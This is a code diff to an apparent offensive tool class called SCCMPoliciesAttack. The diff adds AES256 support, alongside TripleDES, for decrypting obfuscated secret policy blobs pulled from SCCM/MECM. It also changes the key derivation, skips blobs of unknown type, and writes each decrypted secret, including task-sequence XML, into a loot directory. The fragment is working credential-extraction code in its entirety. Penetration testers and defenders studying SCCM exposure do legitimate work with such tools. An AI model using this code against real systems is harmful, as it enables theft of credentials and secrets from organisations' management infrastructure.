@@ -281,7 +281,7 @@ def mscrypt_derive_key_sha1(secret:bytes):
     digest2.update(buf2)
     hash2 = digest2.finalize()
 
-    derived_key = hash1 + hash2[:4]
+    derived_key = hash1 + hash2
     return derived_key
 
 def deobfuscate_secret_policy_blob(output):
@@ -292,12 +292,20 @@ def deobfuscate_secret_policy_blob(output):
     buffer = output[64:64+data_length]
 
     key = mscrypt_derive_key_sha1(output[4:4+0x28])
-    iv = bytes([0] * 8)
-    cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
+    blob_prefix = output[:2]
+
+    if blob_prefix == b'\x89\x13':
+        block_cipher_algorithm = algorithms.TripleDES(key[:24])
+    elif blob_prefix == b'\x8a\x13':
+        block_cipher_algorithm = algorithms.AES256(key[:32])
+
+    iv = bytes([0] * (block_cipher_algorithm.block_size // 8))
+    cipher = Cipher(block_cipher_algorithm, modes.CBC(iv), backend=default_backend())
+
     decryptor = cipher.decryptor()
     decrypted_data = decryptor.update(buffer) + decryptor.finalize()
 
-    padder = padding.PKCS7(64).unpadder() # 64 is the block size in bits for DES3
+    padder = padding.PKCS7(block_cipher_algorithm.block_size).unpadder()
     decrypted_data = padder.update(decrypted_data) + padder.finalize()
 
     try:
@@ -545,7 +553,22 @@ class SCCMPoliciesAttack:
         
         LOG.debug(f"Found {len(blobs_set.keys())} obfuscated blob(s) in secret policy.")
         for i, blob_name in enumerate(blobs_set.keys()):
-            data = deobfuscate_secret_policy_blob(blobs_set[blob_name])
+            blob_prefix = bytes.fromhex(blobs_set[blob_name])[:2]
+            if blob_prefix in (b'\x89\x13', b'\x8a\x13'):
+                data = deobfuscate_secret_policy_blob(blobs_set[blob_name])
+            else:
+                LOG.debug(f"Unable to decrypt obfuscated blob due to unknown blob type with prefix '{blob_prefix.hex()}'.")
+                continue
+
+            # Attempt to pretty-print decrypted XML task sequence blobs prior to file write.
+            if blob_name == "TS_Sequence":
+                try:
+                    blobroot = ET.fromstring(clean_junk_in_XML(data))
+                    ET.indent(blobroot)
+                    data = ET.tostring(blobroot, encoding="unicode")
+                except:
+                    pass
+
             filename = f'{loot_dir}/{policyID}/secretBlob_{str(i+1)}-{blob_name}.txt'
             with open(filename, 'w') as f:
                 f.write(f"Secret property name: {blob_name}\n\n")
